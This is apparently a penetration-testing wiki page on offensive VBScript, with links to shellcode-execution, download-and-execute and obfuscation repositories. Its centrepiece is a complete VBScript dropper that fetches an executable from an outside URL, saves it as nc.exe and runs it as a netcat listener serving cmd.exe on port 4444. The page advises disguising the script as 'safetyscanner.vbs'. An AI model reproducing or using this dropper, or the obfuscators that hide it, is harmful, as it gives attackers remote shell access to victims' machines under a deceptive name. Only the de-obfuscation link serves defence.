# ⭕ VBS

when a VBScript is executed from the command line (cmd.exe), by default it uses wscript (GUI). cscript.exe can be launched explicitly, like this:

```
cscript console.vbs
```

## <mark style="color:red;">shellcode execution with VBScript</mark>

{% embed url="https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/Execute_metasploit_vbs_payload_in_cmd_shell.md" %}

## <mark style="color:red;">VBScript Download & Execute</mark>

Downloads, decode, decrypt and executes a VBScript using cmd and mshta.

{% embed url="https://github.com/AdiMarianMutu/MSHTA-VBS-download-and-execute" %}

#### <mark style="color:green;">without obfuscation:</mark>

Put the following lines into a text file. Name it safetyscanner.vbs and put on desktop.

```
dim http_obj
dim stream_obj
dim shell_obj
 
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
set shell_obj = CreateObject("WScript.Shell")
 
URL = "http://www.mikemurr.com/example.exe" 'Where to download the file from
FILENAME = "nc.exe" 'Name to save the file (on the local system)
RUNCMD = "nc.exe -L -p 4444 -e cmd.exe" 'Command to run after downloading
 
http_obj.open "GET", URL, False
http_obj.send
 
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2
 
shell_obj.run RUNCMD
```

## <mark style="color:red;">Obfuscation</mark>

{% embed url="https://github.com/DoctorLai/VBScript_Obfuscator" %}

{% embed url="https://ther10tz.github.io/Simple-VBScript-Obfuscator" %}

{% embed url="https://github.com/kkar/VBS-Obfuscator-in-Python" %}

## <mark style="color:red;">De-obfuscation</mark>

{% embed url="https://github.com/sbruyere/vbeDecoder" %}
